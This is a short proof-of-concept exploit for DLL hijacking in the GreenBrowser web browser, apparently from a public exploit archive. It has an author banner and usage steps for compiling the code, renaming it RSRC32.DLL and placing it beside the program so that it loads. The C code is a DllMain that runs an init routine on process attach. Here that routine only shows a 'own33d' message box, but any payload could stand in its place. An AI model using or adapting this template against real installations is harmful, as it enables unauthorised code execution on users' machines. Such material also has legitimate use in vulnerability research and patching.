/*
#GreenBrowser DLL Hijacking Exploit (RSRC32.DLL)
#Author : anT!-Tr0J4n
#Greetz : Dev-PoinT.com ~ inj3ct0r.com ~ ,All Dev-poinT members and my friends
#contact: D3v-PoinT@hotmail.com & C1EH@Hotmail.com
# Software Link:http://www.morequick.com/indexen.htm
#Tested on: Windows XP sp3
#how to use :
   Complile and rename to RSRC32.DLL. Place it in the same dir  Execute to check the
  result > Hack3d 



 
#RSRC32.dll (code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"anT!-Tr0J4n", "own33d",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}